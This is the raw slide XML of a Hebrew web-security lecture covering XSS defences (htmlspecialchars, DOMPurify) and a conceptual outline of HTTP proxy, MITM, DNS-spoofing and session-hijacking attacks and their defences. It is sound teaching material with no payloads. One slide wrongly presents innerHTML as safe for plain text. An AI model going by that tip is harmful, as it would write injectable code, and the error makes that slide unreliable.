              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא כלי טוב מאוד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לדוגמה, עבור הקוד:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>$query = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>($_GET['query'], ENT_QUOTES, 'UTF-8');</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>echo "Results for: " . $query;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>גם כאן הפונקציה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>htmlspecialchars</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמבצעת המרה של תווים מיוחדים כמו &lt; &gt; &amp; ", לישויות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ובנוסף יש שימוש גם ב- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>filter_input</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כמו בשקף הקודם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15065768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E205E1-F590-4493-8E32-DE136580AD19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4780722" y="642594"/>
            <a:ext cx="6344478" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - סוגי תקיפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C37E53AC-E2DC-456B-B401-E183C30F2601}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>הגנה מפני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t> מבוסס </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>DOM (DOM-Based XSS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>היגיינת קלט </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Input Sanitization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניקוי קלט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תמיד לנקות ולהסיר תווים מיוחדים ובלתי רצויים מקלטי המשתמש לפני עיבודם. לדוגמה, שימוש בספריות כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>DOMPurify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לניקוי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTML</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>קידוד פלט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תמיד לקודד את הפלט לפני הצגתו בדף, כך שהקוד לא יתפרש כקוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לדוגמה, שימוש ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>textContent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או ב- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כאשר רוצים להוסיף טקסט בלבד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לדוגמ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, עבור הקוד הבא: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>var clean = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>DOMPurify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>.sanitize</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(dirty);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>('content').</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>innerHTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = clean;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="215265712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2C174C2-4112-446B-917C-9B8EA392F252}"/>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E23D9102-00C8-4358-9E04-CDCA1B30CB7C}"/>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24803018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59A7802-F503-4995-A118-09E98FCE49D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D8ACEDAB-1C3B-467E-AC71-60F02CCE2FA1}"/>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429387130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45B49EBA-2173-4038-9065-5B706C6BA6EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1166191" y="2341659"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="6600" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="6600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="140331980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ED13027-A6B9-4CE6-992E-E4FB0DBB7DD8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="731520"/>
            <a:ext cx="5029200" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="he-IL" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ABF92B26-DBF8-4B5B-A27B-A0A8F01CAD5F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מהי התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>? </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> היא סוג של מתקפת אבטחה שבה תוקף מנצל שרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לבצע פעולות זדוניות או לעקוב אחר תעבורת רשת. מתקפה זו יכולה לכלול ציתות, שינוי תכנים, ניתוב מחדש של בקשות, והזרקת קוד זדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מהו שרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>? </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא שרת שפועל כמתווך בין משתמש (לקוח) לבין השרת אליו הוא פונה. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> משמש לעיתים קרובות לצורך שיפור ביצועים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Caching</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הגנה על זהות המשתמש, והגברת האבטחה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="394313528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026016-D103-4BE9-8FE4-873F7AAEC24B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4452730" y="642594"/>
            <a:ext cx="6672470" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="he-IL" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1DA8DD34-86C3-49A6-9335-510E1B608E7F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1679713"/>
            <a:ext cx="10058400" cy="4750903"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>סוגי התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>:HTTP Proxy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Man-in-the-Middle (MITM) .1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בהתקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MITM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף מיירט את התקשורת בין הלקוח לשרת. הוא יכול לשנות את התוכן, לקרוא את המידע המועבר ואפילו להזריק קוד זדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>HTTP Injection .2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בהתקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Injection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף מזריק פקודות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או קוד זדוני לבקשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> , זה יכול לקרות כאשר הלקוח שולח בקשה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>לפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>והפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לא מבצע בדיקות תקינות על התוכן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>DNS Spoofing .3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בהתקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> DNS Spoofing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף משנה את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של השרת כדי לנתב את התעבורה לאתר מזויף או לשרת שנשלט על ידו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Session Hijacking .4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בהתקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Session Hijacking </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> התוקף גונב את ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Session ID </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של המשתמש ומשתמש בו כדי לגשת לחשבון או למידע שלו.</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32356695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4629FF0-9E8D-4910-B798-904F8D236023}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2037522" y="642594"/>
            <a:ext cx="9087678" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך מתבצעת התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>?HTTP Proxy</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{779D9046-4DA4-493B-801B-1D77B6FA2BC6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 1: יצירת שרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> זדוני</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף יוצר שרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זדוני ומפיץ את כתובתו ללקוחות. הלקוחות עלולים להגדיר את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הזדוני כשרת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שלהם בגלל סיבות שונות, כגון פרסום מזויף או הנדסה חברתית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 2: יירוט תעבורה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כשהלקוחות מתחילים להשתמש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בפרוקסי</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>, התוקף מיירט את כל התעבורה העוברת דרכו. הוא יכול לצפות בתוכן הבקשות והתשובות, לשנות אותן או להזריק קוד זדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שלב 3: ביצוע הפעולות הזדוניות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף יכול לבצע מספר פעולות זדוניות כמו גניבת מידע רגיש (סיסמאות, כרטיסי אשראי), שינוי תוכן התשובות (להציג תכנים זדוניים במקום האתר המקורי), והזרקת קוד זדוני (למשל, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמבצע פעולות מזיקות).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3130652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2774808-8B34-4BD3-ADE2-884918072757}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1689652" y="642594"/>
            <a:ext cx="9435548" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דרכים להתגונן מהתקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP Proxy</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E5D0BF3-0EAE-439B-9ABB-856D2554973A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. שימוש בהצפנה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השתמש בפרוטוקול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> להצפנת התעבורה בין הלקוח לשרת. זה מקשה על התוקף לקרוא או לשנות את התוכן המועבר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. אימות שרתים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Server Authentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ודא שהלקוח מאמת את זהות השרת באמצעות תעודות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SSL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
